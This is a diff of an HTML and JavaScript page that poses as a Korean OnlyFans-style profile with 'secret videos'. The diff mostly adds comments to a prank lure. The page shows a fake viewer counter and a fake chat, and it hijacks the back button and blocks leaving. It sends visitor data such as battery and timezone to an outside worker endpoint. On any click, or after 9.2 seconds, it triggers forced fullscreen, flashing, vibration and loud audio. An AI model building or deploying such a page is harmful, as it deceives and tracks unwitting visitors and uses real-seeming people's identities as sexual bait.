@@ -4,24 +4,33 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HanJiyu07 | Profile & Stats</title>
+    
+    <!-- 오픈그래프 (카카오톡, 디스코드 공유 시 미리보기) -->
     <meta property="og:title" content="HanJiyu07 - OnlyFans 💎">
     <meta property="og:description" content="VVIP 시크릿 영상 공개 중 (무료 입장)">
     <meta property="og:image" content="https://chldudwo.github.io/surprise-maltese/pro_hanjiyu.jpg"> 
     <meta property="og:url" content="https://onlyfans.com/">
+    
+    <!-- 파비콘 (브라우저 탭 아이콘) -->
     <link rel="icon" href="https://img.icons8.com/fluency/48/user-female-circle.png" type="image/x-icon">
     
+    <!-- ==========================================
+         [1] 이미지 사전 로드 (로딩 속도 최적화)
+         ========================================== -->
     <!-- 공통 사진 미리 불러오기 -->
     <link rel="preload" href="maltese.jpg" as="image">
     <link rel="preload" href="background.jpg" as="image">
     <link rel="preload" href="intro.jpg" as="image">
     
+    <!-- URL 꼬리표(?p=이름)에 따라 동적으로 프로필 사진 미리 불러오기 -->
     <script>
         const headParams = new URLSearchParams(window.location.search);
         let targetId = headParams.get('p');
         
+        // 허용된 닉네임 목록 (추가 인원이 생기면 여기에 배열로 추가)
         const allowedTargets = ['hanjiyu', 'seoarin'];
         if (!allowedTargets.includes(targetId)) {
-            targetId = 'hanjiyu';
+            targetId = 'hanjiyu'; // 이상한 값이면 기본값으로 강제 고정
         }
 
         const preloadLink = document.createElement('link');
@@ -31,14 +40,19 @@
         document.head.appendChild(preloadLink);
     </script>
 
+    <!-- ==========================================
+         [2] 스타일시트 (CSS)
+         ========================================== -->
     <style>
+        /* --- 1. 기본 스타일 --- */
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f3f4f6; color: #1f2937; min-height: 100vh; padding-bottom: 50px; }
         #site-logo { position: absolute; top: 20px; left: 20px; max-width: 150px; height: auto; z-index: 10; }
-        
         .header-bg { width: 100%; height: 250px; background-color: #d1d5db; background-image: url('background.jpg'); background-size: cover; background-position: center; }
         
+        /* --- 2. 프로필 영역 --- */
         .profile-container { max-width: 800px; margin: -60px auto 0; padding: 0 20px; position: relative; }
-
+        
+        /* PC 환경일 때 프로필 위로 끌어올리기 */
         @media (min-width: 601px) {
             .profile-container { margin: -230px auto 0; }
         }
@@ -51,6 +65,7 @@
         .name { font-size: 28px; font-weight: 800; margin: 0 0 5px 0; display: flex; align-items: center; gap: 5px; }
         .verified-badge { color: #00AEEF; font-size: 20px; }
         
+        /* 실시간 시청자 수 UI */
         .live-counter-box { display: inline-flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 600; color: #ef4444; background: #fee2e2; padding: 6px 12px; border-radius: 20px; margin-bottom: 15px; }
         .live-dot { width: 8px; height: 8px; background-color: #ef4444; border-radius: 50%; animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
@@ -58,12 +73,16 @@
         .username { font-size: 16px; color: #6b7280; margin: 0 0 15px 0; }
         .bio { font-size: 16px; line-height: 1.6; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px; }
 
-        /* 🔥 핵심 해결 구역 1: 영상과 채팅 박스 전체 높이를 260px로 영구 고정 🔥 */
-        .media-row { display: flex; gap: 15px; margin-bottom: 30px; align-items: stretch; height: 260px; }
+        /* --- 3. 영상 및 채팅 영역 (레이아웃 완벽 고정) --- */
+        .media-row {
+            display: flex; gap: 15px; margin-bottom: 30px; align-items: stretch;
+            height: 260px; min-height: 260px; max-height: 260px; /* 전체 박스 크기 영구 고정 */
+            overflow: hidden;
+        }
         
+        /* 가짜 영상 플레이어 */
         .fake-player-container { flex: 1.5; position: relative; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.2); cursor: pointer; transition: transform 0.2s; -webkit-tap-highlight-color: transparent; height: 100%; }
         .fake-player-container:hover { transform: scale(1.02); }
-        
         .blurred-thumbnail { width: 100%; height: 100%; background-image: url('intro.jpg'); background-size: cover; background-position: center; filter: blur(6px) brightness(0.9); transform: scale(1.05); }
         .play-button-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 70px; background: rgba(0,0,0,0.6); border: 4px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 35px; box-shadow: 0 0 20px rgba(0,0,0,0.5); animation: pulse-play 2s infinite; z-index: 2; }
         .video-label { position: absolute; bottom: 12px; left: 12px; color: white; background: rgba(239, 68, 68, 0.9); padding: 5px 10px; border-radius: 8px; font-weight: bold; font-size: 13px; z-index: 2; }
@@ -74,66 +93,46 @@
             100% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
         }
 
-        /* 🔥 핵심 해결 구역 2: 채팅 부모 창 (자식 가두기) 🔥 */
-        #fake-chat-zone { 
-            flex: 1; 
-            background: rgba(255, 255, 255, 0.8); 
-            backdrop-filter: blur(10px); 
-            -webkit-backdrop-filter: blur(10px); 
-            border-radius: 16px; 
-            box-shadow: 0 -5px 15px rgba(0,0,0,0.05); 
-            border: 1px solid rgba(0,0,0,0.05); 
-            position: relative; /* 자식을 가두는 절대 기준점 */
-            overflow: hidden; 
-            height: 100%;
+        /* 채팅창 부모 프레임 */
+        #fake-chat-zone {
+            flex: 1; display: flex;
+            min-width: 0; min-height: 0; height: 100%; /* Flex 자식 팽창 버그 차단 */
+            background: rgba(255,255,255,.8); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+            border-radius: 16px; border: 1px solid rgba(0,0,0,.05); box-shadow: 0 -5px 15px rgba(0,0,0,.05);
+            overflow: hidden;
         }
         
-        /* 🔥 핵심 해결 구역 3: 실제 채팅이 쌓이는 스크롤 구역 (Position Absolute) 🔥 */
-        #chat-messages { 
-            position: absolute; /* Flex 구조를 벗어나 물리적으로 박스 안에 갇힘 */
-            top: 0; bottom: 0; left: 0; right: 0; /* 부모 크기에 100% 딱 맞춤 */
-            padding: 12px; 
-            display: flex; 
-            flex-direction: column; 
-            gap: 8px; 
-            overflow-y: auto; /* 넘치면 무조건 스크롤 생성 */
-            scroll-behavior: smooth; 
+        /* 실제 채팅이 스크롤되는 구역 */
+        #chat-messages {
+            flex: 1; display: flex; flex-direction: column; gap: 8px;
+            padding: 12px;
+            overflow-y: auto; overflow-x: hidden; /* 세로 스크롤 활성화 */
+            box-sizing: border-box; scroll-behavior: smooth; scrollbar-width: thin;
         }
 
+        /* 커스텀 스크롤바 */
         #chat-messages::-webkit-scrollbar { width: 5px; }
         #chat-messages::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
         
+        /* 채팅 텍스트 스타일 */
         .chat-msg { font-size: 13px; line-height: 1.4; animation: fade-in-up 0.3s ease-out; cursor: pointer; font-weight: 900; }
         .chat-user { font-weight: 900; }
         .chat-text { color: #111827; font-weight: 900; }
         
+        /* BJ 멘트 전용 스타일 */
         .bj-msg { background: #fef3c7; border-left: 4px solid #f59e0b; padding: 6px 8px; border-radius: 4px; margin-top: 4px; margin-bottom: 4px; }
         .bj-name { color: #ea580c !important; text-shadow: 1px 1px 0px rgba(255,255,255,0.5); }
         .bj-text { color: #b45309; font-weight: 900; }
 
         @keyframes fade-in-up { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* 모바일 대응 (모바일도 동일하게 높이 강제 고정) */
-        @media (max-width: 600px) {
-            .header-bg { height: 170px; } 
-            .profile-container { margin: -60px auto 0; }
-            .avatar-container { width: 132px; height: 132px; margin-bottom: 10px; } 
-            .name-section { margin-bottom: 15px; }
-            .name { font-size: 24px; margin-bottom: 2px; }
-            .username { margin-bottom: 8px; font-size: 14px; }
-            .bio { padding: 12px; font-size: 13px; line-height: 1.4; margin-bottom: 15px; } 
-            .media-row { gap: 10px; height: 170px; margin-bottom: 20px; } /* 모바일 전체 줄 높이 170px 고정 */
-            .play-button-overlay { width: 50px; height: 50px; font-size: 25px; }
-            .video-label { font-size: 11px; padding: 4px 8px; bottom: 8px; left: 8px; }
-            #chat-messages { padding: 8px; }
-            .chat-msg { font-size: 11px; }
-        }
-
+        /* --- 4. 통계 박스 --- */
         .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
         .stat-box { background: white; padding: 20px; border-radius: 12px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
         .stat-value { font-size: 24px; font-weight: bold; color: #111827; }
         .stat-label { font-size: 14px; color: #6b7280; margin-top: 5px; }
 
+        /* --- 5. 깜짝 놀래키기(Prank) 효과 스타일 --- */
         #prank-zone { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; height: 100dvh; z-index: 9999; background-color: black; text-align: center; }
         #maltese-img { width: 100%; height: 100%; object-fit: contain; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; pointer-events: none; }
         .prank-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #ef4444; font-size: 50px; font-weight: 900; text-align: center; width: 100%; text-shadow: 3px 3px 10px rgba(0,0,0,0.9); pointer-events: none; }
@@ -151,20 +150,47 @@
         .horror-active #maltese-img { animation: shake 0.1s infinite; will-change: transform; }
         .horror-active #prank-zone { animation: flash 0.08s infinite; }
         .horror-active, .horror-active * { cursor: none !important; }
+
+        /* --- 6. 모바일 반응형 --- */
+        @media (max-width: 600px) {
+            .header-bg { height: 170px; } 
+            .profile-container { margin: -60px auto 0; }
+            .avatar-container { width: 132px; height: 132px; margin-bottom: 10px; } 
+            .name-section { margin-bottom: 15px; }
+            .name { font-size: 24px; margin-bottom: 2px; }
+            .username { margin-bottom: 8px; font-size: 14px; }
+            .bio { padding: 12px; font-size: 13px; line-height: 1.4; margin-bottom: 15px; } 
+            
+            /* 모바일 미디어 영역 높이 조정 */
+            .media-row {
+                gap: 10px; margin-bottom: 20px;
+                height: 170px; min-height: 170px; max-height: 170px;
+                overflow: hidden;
+            }
+            .play-button-overlay { width: 50px; height: 50px; font-size: 25px; }
+            .video-label { font-size: 11px; padding: 4px 8px; bottom: 8px; left: 8px; }
+            #chat-messages { padding: 8px; }
+            .chat-msg { font-size: 11px; }
+        }
     </style>
 </head>
 
-<body oncontextmenu="return false;">
+<body oncontextmenu="return false;"> <!-- 우클릭 방지 -->
 
+    <!-- 사이트 로고 및 상단 배경 -->
     <img id="site-logo" src="logo.png" alt="사이트 로고">
     <div class="header-bg"></div>
 
+    <!-- 메인 컨텐츠 컨테이너 -->
     <div class="profile-container">
+        
+        <!-- 1. 프로필 사진 영역 -->
         <div class="avatar-container">
             <div class="avatar" id="profile-avatar"></div>
             <div class="active-badge"></div>
         </div>
 
+        <!-- 2. 이름 및 소개글 영역 -->
         <div class="name-section">
             <div class="live-counter-box">
                 <div class="live-dot"></div>
@@ -179,19 +205,22 @@
             </div>
         </div>
 
+        <!-- 3. 비디오 썸네일 & 채팅창 영역 -->
         <div class="media-row">
+            <!-- 가짜 비디오 플레이어 -->
             <div id="video-bait" class="fake-player-container js-prank-btn">
                 <div class="blurred-thumbnail"></div>
                 <div class="play-button-overlay">▶</div>
                 <div class="video-label">Live</div>
             </div>
             
+            <!-- 가짜 채팅창 -->
             <div id="fake-chat-zone">
-                <!-- 여기에 스크롤이 무조건 걸립니다 -->
                 <div id="chat-messages"></div>
             </div>
         </div>
 
+        <!-- 4. 하단 통계 영역 -->
         <div class="stats-grid">
             <div class="stat-box"><div class="stat-value">478</div><div class="stat-label">Photos</div></div>
             <div class="stat-box"><div class="stat-value">91</div><div class="stat-label">Videos</div></div>
@@ -199,17 +228,22 @@
         </div>
     </div>
 
+    <!-- 5. 낚시(Prank) 발동 시 덮어씌워질 화면 -->
     <div id="overlay"></div>
     <div id="prank-zone">
         <img id="maltese-img" src="maltese.jpg" alt="말티즈" draggable="false">
         <div class="prank-text"></div>
+        <!-- 놀래키기용 오디오 -->
         <audio id="bark-sound" src="bark.mp3" preload="auto"></audio>
     </div>
 
+    <!-- ==========================================
+         [3] 자바스크립트 (로직 제어)
+         ========================================== -->
     <script>
-        // ==========================================
-        // 🎭 0. 프로필 텍스트 & 프사 둔갑술
-        // ==========================================
+        // ------------------------------------------
+        // A. 프로필 데이터 세팅 및 UI 렌더링
+        // ------------------------------------------
         const profileDB = {
             "hanjiyu": {
                 name: "HanJiyu07",
@@ -227,36 +261,42 @@
 
         const currentData = profileDB[targetId];
 
+        // 선택된 타겟(targetId)에 맞춰 텍스트 및 이미지 교체
         document.title = `${currentData.name} | Profile & Stats`;
         document.getElementById('profile-name').innerHTML = `${currentData.name} <span class="verified-badge">✓</span>`;
         document.getElementById('profile-username').innerText = currentData.username;
         document.getElementById('profile-bio').innerHTML = currentData.bio;
         document.getElementById('profile-avatar').style.backgroundImage = `url('pro_${targetId}.jpg')`;
 
-        // ==========================================
-        // 🔒 1. 갇힘(Trap) 시스템 발동 로직 
-        // ==========================================
+
+        // ------------------------------------------
+        // B. 유저 이탈 방지 (뒤로가기 막기 등)
+        // ------------------------------------------
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1); 
             if (!isPrankActive) triggerPrank("trap_back");
         };
+        
         window.addEventListener('beforeunload', function (e) {
             if (!isPrankActive && !hasSeenPicture) {
                 e.preventDefault(); e.returnValue = '';
             }
         });
+        
         document.addEventListener("visibilitychange", () => {
             if (document.hidden) { document.title = "💬 새로운 메시지가 도착했습니다"; } 
             else { document.title = `${currentData.name} | Profile & Stats`; }
         });
 
-        // ==========================================
-        // 📈 2. 실시간 방문자 페이크 로직 
-        // ==========================================
+
+        // ------------------------------------------
+        // C. 가짜 실시간 시청자 수 랜덤 변동
+        // ------------------------------------------
         const countEl = document.getElementById('visitor-count');
         let currentCount = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
         countEl.innerText = currentCount;
+        
         setInterval(() => {
             const change = Math.floor(Math.random() * 7) - 3;
             currentCount += change;
@@ -265,9 +305,10 @@
             countEl.innerText = currentCount;
         }, 4000);
 
-        // ==========================================
-        // 📡 3. 서버리스 백엔드 통신
-        // ==========================================
+
+        // ------------------------------------------
+        // D. 백엔드 통신 및 유저 정보 수집 (서버리스)
+        // ------------------------------------------
         const WORKER_URL = "https://flat-night-2b27.chldudwo2158.workers.dev"; 
         const startTime = new Date();
         let isPrankActive = false;
@@ -291,6 +332,7 @@
             }).catch(err => console.log("로그 전송 실패"));
         }
 
+        // 수집할 기본 유저 데이터
         let userData = {
             battery_info: null,
             timeZone: new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' }),
@@ -310,9 +352,10 @@
             logToBackend("entry");
         }
 
-        // ==========================================
-        // 💬 4. 실시간 채팅 로직 
-        // ==========================================
+
+        // ------------------------------------------
+        // E. 가짜 실시간 채팅 시스템 (순서 랜덤 + 중복 방지)
+        // ------------------------------------------
         const chatMessages = document.getElementById('chat-messages');
         
         const chatData = [
@@ -338,6 +381,7 @@
             { user: "yesyes", type: "normal", color: "#3b82f6", text: `제대로 해봐 현기증 난다` }
         ];
 
+        // 배열 무작위 섞기 함수 (Fisher-Yates)
         function shuffleArray(array) {
             for (let i = array.length - 1; i > 0; i--) {
                 const j = Math.floor(Math.random() * (i + 1));
@@ -345,16 +389,19 @@
             }
         }
         
-        shuffleArray(chatData);
+        shuffleArray(chatData); // 최초 실행 시 1회 섞기
 
         let chatIndex = 0;
         let lastPrintedUser = "";
 
+        // 채팅 1개를 화면에 추가하는 함수
         function addFakeMessage(isInit = false) {
+            // 풀을 다 소모하면 다시 섞기
             if (chatIndex >= chatData.length) {
                 shuffleArray(chatData);
                 chatIndex = 0;
                 
+                // 직전 마지막 멘트와 방금 섞은 첫 멘트가 겹치면 순서 맞바꿈 (연속 중복 방지)
                 if (chatData[0].user === lastPrintedUser) {
                     [chatData[0], chatData[1]] = [chatData[1], chatData[0]];
                 }
@@ -364,6 +411,7 @@
             chatIndex++; 
             lastPrintedUser = msg.user; 
             
+            // 등급 뱃지 할당
             let badge = "";
             if (msg.type === "vip") badge = "👑 ";
             if (msg.type === "manager") badge = "🛡️ ";
@@ -371,29 +419,36 @@
             const msgEl = document.createElement('div');
             msgEl.className = 'chat-msg js-prank-btn';
             
-            if(isInit) msgEl.style.animation = "none"; 
+            if(isInit) msgEl.style.animation = "none"; // 처음 5개 깔아둘 땐 튀어오르는 효과 제거
             
             msgEl.innerHTML = `<span class="chat-user" style="color: ${msg.color}">${badge}${msg.user}:</span> <span class="chat-text">${msg.text}</span>`;
             
             chatMessages.appendChild(msgEl); 
             
-            if (chatMessages.children.length > 50) {
+            // 메모리 누수 방지 및 스크롤 관리 위해 최대 50개 유지
+            while (chatMessages.children.length > 50) {
                 chatMessages.removeChild(chatMessages.firstChild);
             }
             
-            chatMessages.scrollTop = chatMessages.scrollHeight;
+            // 새로운 채팅이 달리면 항상 최하단으로 자동 스크롤
+            requestAnimationFrame(() => {
+                chatMessages.scrollTop = chatMessages.scrollHeight;
+            });
         }
 
+        // 페이지 렌더링 시 채팅 5개 미리 깔아두기
         for(let i = 0; i < 5; i++) {
             addFakeMessage(true);
         }
 
+        // 무작위 시간 간격(0.7초~1.5초)으로 지속적인 채팅 생성 루프
         function startChat() {
             addFakeMessage();
             setTimeout(startChat, Math.random() * 800 + 700);
         }
         setTimeout(startChat, 1000);
 
+        // 접속 후 정확히 4초 뒤, BJ 고정 공지 멘트 송출
         setTimeout(() => {
             const msgEl = document.createElement('div');
             msgEl.className = 'chat-msg bj-msg js-prank-btn';
@@ -402,20 +457,23 @@
             chatMessages.scrollTop = chatMessages.scrollHeight;
         }, 4000);
 
-        // ==========================================
-        // 🎭 5. 지옥문 오픈 (최종 Prank 로직)
-        // ==========================================
+
+        // ------------------------------------------
+        // F. 깜짝 놀래키기(Prank) 효과 핵심 로직
+        // ------------------------------------------
         const prankZone = document.getElementById('prank-zone');
         const overlay = document.getElementById('overlay');
         const audio = document.getElementById('bark-sound');
 
+        // 프랭크 발동 함수
         function triggerPrank(detail = "unknown") {
-            if (isPrankActive) return;
+            if (isPrankActive) return; // 중복 발동 방지
             isPrankActive = true;
 
             document.body.classList.add('horror-active');
             audio.volume = 1.0; 
 
+            // 전체화면 요청
             const docEl = document.documentElement;
             if (docEl.requestFullscreen) {
                 docEl.requestFullscreen().catch(err => {
@@ -423,15 +481,17 @@
                 });
             }
 
+            // 모바일 진동 발생 (지원 기기 한정)
             if ('vibrate' in navigator) {
                 navigator.vibrate([100, 50, 100, 50, 800]); 
             }
 
+            // 화면 전환
             overlay.style.display = 'block';
             prankZone.style.display = 'block';
             
+            // 오디오 재생 (브라우저 정책에 따라 차단될 수 있음)
             let playPromise = audio.play();
-            
             if (playPromise !== undefined) {
                 playPromise.then(_ => {
                     hasAudioPlayed = true;
@@ -449,15 +509,15 @@
                 });
             }
 
+            // 비디오 버튼 텍스트 변경
             const playLabel = document.querySelector('.video-label');
             if (playLabel) playLabel.innerText = "연결 실패! (강아지 출몰)";
             
+            // 화면 스크롤 금지
             document.body.style.overflow = 'hidden';
         }
 
-        // ==========================================
-        // 😱 6. 패닉 클릭/키보드 감지 로직
-        // ==========================================
+        // 유저가 당황해서 화면이나 키보드를 마구 누를 때 사운드 강제 재생
         function catchPanicAction() {
             if (isPrankActive && !hasAudioPlayed) {
                 const docEl = document.documentElement;
@@ -482,9 +542,10 @@
         window.addEventListener('click', catchPanicAction);
         window.addEventListener('keydown', catchPanicAction);
 
-        // ==========================================
-        // 🟢 낚시 발동 트리거 
-        // ==========================================
+
+        // ------------------------------------------
+        // G. 프랭크 발동 트리거 (버튼 클릭, 타이머 등)
+        // ------------------------------------------
         const videoBait = document.getElementById('video-bait');
         videoBait.addEventListener('click', function(e) { 
             e.stopPropagation(); 
@@ -500,11 +561,13 @@
         });
 
         document.body.addEventListener('click', function(e) {
+            // 영상이나 채팅창 외의 여백을 클릭해도 발동
             if (!e.target.closest('#video-bait') && !e.target.closest('#fake-chat-zone')) {
                 triggerPrank("click_body");
             }
         });
 
+        // 사용자가 가만히 있어도 9.2초 뒤 무조건 자동 발동
         setTimeout(() => { 
             if (!isPrankActive) triggerPrank("timeout_auto"); 
         }, 9200); 
